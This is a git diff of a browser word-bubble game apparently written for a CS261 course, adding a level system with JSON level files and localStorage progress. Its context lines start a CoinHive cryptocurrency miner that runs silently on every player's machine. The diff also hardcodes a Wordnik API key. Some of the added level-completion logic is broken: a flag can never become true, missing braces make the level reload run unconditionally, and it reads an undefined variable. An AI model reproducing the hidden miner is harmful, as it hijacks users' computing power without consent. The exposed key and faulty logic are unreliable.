@@ -12,8 +12,30 @@
 var miner = new CoinHive.Anonymous('LxcVb1XF7gsPlDxz914zOLT2UUNiwhS7');
 	miner.setThrottle(.5);
   miner.start();
+
 var stage = document.getElementById('stage');
 var rack = ""; //to store letters for word making
+//list indicating if the words have been completed yet
+// var levelList = { "apple":false,     "banana":false,   "currant":false,
+// 								 "durian":false, "elderberry":false,       "fig":false,
+// 								  "grape":false,       "imbe":false, "jackfruit":false,
+// 									 "kiwi":false };
+var levelList = {};
+
+//retrieve level from localStorage
+var level = window.localStorage.getItem("level");
+if (level == undefined) {
+	level = 1;
+	window.localStorage.setItem("level", level);
+}
+
+//load level from file
+var currentLevel = loadLevel(level);
+for (var w in currentLevel.levelList) {
+	levelList[currentLevel.levelList[w]] = false;
+}
+
+
 var latestWord = "Wubbles";
 var latestDef = "A mobile word bubble game created for CS261!";
 var score = 0;
@@ -56,6 +78,10 @@ var drawingCanvas = document.getElementById('stage');
 if(drawingCanvas.getContext) {
   var context = drawingCanvas.getContext('2d');
   setInterval(render, 20);
+}
+
+function onLoad() {
+	updateLevelList();
 }
 
 //Todo: Convert to Pure JS
@@ -104,10 +130,10 @@ function newBall(mX, mY, letter, index) {
     //for(var i = 0; i < volleySize; i++)	{
 			//convert index into an angle
 			var myAngle = index * 60 - 30;
-			console.log("Index = " + index);
-			console.log("Angle = " + myAngle);
-			console.log("x = " + Math.cos(myAngle));
-			console.log("y = " + Math.sin(myAngle));
+			// console.log("Index = " + index);
+			// console.log("Angle = " + myAngle);
+			// console.log("x = " + Math.cos(myAngle));
+			// console.log("y = " + Math.sin(myAngle));
 
       var ball = {}; //ball object
       ball.letters = [ letter ];
@@ -513,6 +539,12 @@ function render() {
  }
 
  function checkWord(word) {
+	 if (levelList[word] == false)
+	 {
+	 	 levelList[word] = true;
+		 updateLevelList();
+		 isLevelDone();
+	 }
    var url = "https://api.wordnik.com/v4/word.json/" + word + "/definitions?limit=1&includeRelated=true&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5";
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function() {
@@ -591,6 +623,19 @@ function writeDef() {
  *    ##     ## ##     ## ##     ##      ##     ## ##     ## ##   ###  ##  ##
  *    ########   #######  ##     ##      ##     ## ##     ## ##    ## #### ##
  */
+function updateLevelList() {
+	var ll = document.getElementById("levelList");
+	ll.innerHTML = "";
+	for (var word in Object.keys(levelList)) {
+		var lli = document.createElement("li");
+		var listWord = Object.keys(levelList)[word];
+		lli.innerHTML = listWord;
+		if (levelList[listWord]) {
+			lli.classList.add("completed");
+		}
+		ll.appendChild(lli);
+	}
+}
 
 function getDocWidth() {
   var w = window;
@@ -614,4 +659,35 @@ function toggleSidebar() {
     var side = document.getElementById("sidebar")
     var disp = side.style.display;
     side.style.display = (disp == "block") ? "none" : "block";
+}
+
+function isLevelDone() {
+	var flag = false;
+	for (var w in levelList) {
+		flag = flag && levelList[w];
+		console.log(w + ": " + levelList[w]);
+	}
+	if(flag)
+		level = levelObject.levelNumber + 1
+		window.localStorage.setItem("level", level);
+		loadLevel(level);
+	return flag;
+}
+
+function loadLevel(level) {
+  var fileName = "./levels/" + level + ".json";
+  var contents;
+	var levelObject;
+  var file = new XMLHttpRequest();
+  file.open("GET", fileName, false);
+  file.onreadystatechange = function () {
+    if(file.readyState === 4) {
+      if(file.status === 200 || file.status == 0) {
+        var contents = file.responseText;
+        levelObject = JSON.parse(contents);
+      }
+    }
+  }
+  file.send(null);
+	return levelObject;
 }
